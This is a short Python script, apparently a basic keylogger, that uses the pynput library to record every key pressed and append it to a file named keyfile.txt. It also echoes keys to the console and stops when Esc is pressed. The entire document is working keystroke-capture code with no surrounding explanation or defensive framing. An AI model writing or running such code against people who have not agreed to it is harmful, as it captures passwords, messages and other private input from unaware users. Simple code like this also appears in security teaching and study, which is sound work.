from pynput import keyboard

def keyPressed(key):
    print(str(key))
    try:
        with open("keyfile.txt", 'a', encoding='utf-8') as logKey:
            try:
                logKey.write(key.char)
            except AttributeError:
                logKey.write(f'[{key}] ')
    except IOError as e:
            print(f"File Error: {e}")

    if key == keyboard.Key.esc:
        return False

if __name__ == "__main__":
    try:
        with keyboard.Listener(on_press=keyPressed) as listener:
             listener.join()
    except:
         print("Key logger stopped by user.")